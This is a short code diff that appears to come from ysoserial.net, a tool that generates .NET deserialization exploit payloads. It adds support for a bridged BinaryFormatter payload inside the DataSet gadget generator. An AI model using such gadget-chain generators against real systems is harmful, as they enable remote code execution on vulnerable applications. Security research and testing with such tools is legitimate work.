@@ -34,12 +34,24 @@ namespace ysoserial.Generators
             return new List<string> { "BinaryFormatter", "SoapFormatter", "LosFormatter"};
         }
 
+        public override string SupportedBridgedFormatter()
+        {
+            return Formatters.BinaryFormatter;
+        }
+
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-
-            byte[] init_payload = (byte[]) new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
+            byte[] binaryFormatterPayload;
+            if (BridgedPayload != null)
+            {
+                binaryFormatterPayload = (byte[])BridgedPayload;
+            }
+            else
+            {
+                binaryFormatterPayload = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
+            }
             
-            DataSetMarshal payloadDataSetMarshal = new DataSetMarshal(init_payload);
+            DataSetMarshal payloadDataSetMarshal = new DataSetMarshal(binaryFormatterPayload);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
